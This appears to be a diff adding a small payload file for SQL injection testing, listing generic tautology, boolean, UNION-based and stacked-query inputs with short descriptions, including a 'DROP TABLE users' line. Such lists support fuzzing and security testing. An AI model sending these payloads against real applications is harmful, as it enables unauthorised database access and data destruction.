@@ -1,0 +1,13 @@
+# SQL Injection Payloads
+# Each line: payload|description
+
+' OR '1'='1|Basic tautology
+' OR '1'='1' --|Tautology with comment
+' OR '1'='1' #|Tautology with hash comment
+1' AND '1'='1|Boolean-based true
+1' AND '1'='2|Boolean-based false
+' UNION SELECT 1--|Union select basic
+' UNION SELECT 1,2,3--|Union select multiple columns
+1; DROP TABLE users--|Stacked query (basic)
+1' OR '1'='1' LIMIT 1--|Limit bypass
+" OR "1"="1|Double quote tautology
